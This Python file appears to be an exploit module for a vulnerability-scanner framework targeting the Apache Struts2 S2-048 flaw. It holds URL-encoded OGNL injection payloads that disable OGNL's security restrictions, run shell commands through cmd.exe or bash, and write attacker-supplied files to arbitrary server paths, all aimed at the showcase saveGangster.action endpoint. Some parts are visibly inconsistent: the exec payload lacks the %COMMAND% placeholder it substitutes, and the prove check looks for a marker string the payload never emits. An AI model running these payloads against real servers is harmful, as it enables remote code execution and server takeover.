#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from script import Script, SERVER_PORT_MAP

class POC(Script):
    '''
    S2_048 未验证
    '''
    def __init__(self, target=None):
        self.server_type = SERVER_PORT_MAP.WEB
        self.name = 'Struts2-048'
        self.keyword = ['struts2', 'java']
        self.info = 'Struts2-048'
        self.type = 'rce'
        self.level = 'high'
        Script.__init__(self, target=target, server_type=self.server_type)

    def prove(self):
        self.get_url()
        if self.url != None:
            prove_poc = '''%25%7b(%23nike%3d%27multipart%2fform-data%27).(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd%3d%27netstat+-an%27).(%23iswin%3d(%40java.lang.System%40getProperty(%27os.name%27).toLowerCase().contains(%27win%27))).(%23cmds%3d(%23iswin%3f%7b%27cmd.exe%27%2c%27%2fc%27%2c%23cmd%7d%3a%7b%27%2fbin%2fbash%27%2c%27-c%27%2c%23cmd%7d)).(%23p%3dnew+java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3d%23p.start()).(%23ros%3d(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())).(%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2c%23ros)).(%23ros.flush())%7d'''
            poc_key =  "struts2_security_vul"
            try:
                _data = 'name=' + prove_poc + '&age=a&__checkbox_bustedBefore=true&description=s'
                res = self.curl('get', self.base_url + '/struts2-showcase/integration/saveGangster.action', params=_data)
                if poc_key in res.headers or poc_key in res.text:
                    self.flag = 1
                    self.req.append({"poc": prove_poc})
                    self.res.append({"info": self.url, "key": "struts2_048"})
            except:
                pass

    def exec(self):
        self.get_url()
        if self.url != None:
            cmd = self.parameter['cmd']
            exec_poc = '''%25%7b(%23test%3d%27multipart%2fform-data%27).(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest()).(%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse()).(%23res.setContentType(%27text%2fhtml%3bcharset%3dUTF-8%27)).(%23res.getWriter().print(%27start%3astruts2_security_%27)).(%23res.getWriter().print(%27check%3aend%27)).(%23res.getWriter().flush()).(%23res.getWriter().close())%7d'''
            try:
                _data = 'name=' + exec_poc.replace("%COMMAND%", cmd) + '&age=a&__checkbox_bustedBefore=true&description=s'
                res = self.curl('post', self.base_url + '/struts2-showcase/integration/saveGangster.action', data=_data).text
                self.flag = 1
                self.req.append({"poc": exec_poc})
                self.res.append({"info": res, "key": cmd})
            except:
                pass

    def upload(self):
        self.get_url()
        if self.url != None:
            upload_poc = '''%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('start:')).(#fs=new java.io.FileOutputStream(%PATH%)).(#out=#res.getOutputStream()).(@org.apache.commons.io.IOUtils@copy(#req.getInputStream(),#fs)).(#fs.close()).(#out.print('oko')).(#out.print('kok/:end')).(#out.print(#req.getContextPath())).(#out.close())}'''
            despath = self.parameter['despath']
            srcpath = self.parameter['srcpath']
            content = self.read_file(srcpath['srcpath'])
            try:
                _data = 'name=' + upload_poc.replace("%PATH%", despath).replace("%FILECONTENT%",content) + '&age=a&__checkbox_bustedBefore=true&description=s'
                self.curl('post', self.base_url + '/struts2-showcase/integration/saveGangster.action', data=_data)
                self.flag = 1
                self.req.append({"poc": upload_poc})
                self.res.append({"info": despath, "key": 'upload'})
            except:
                pass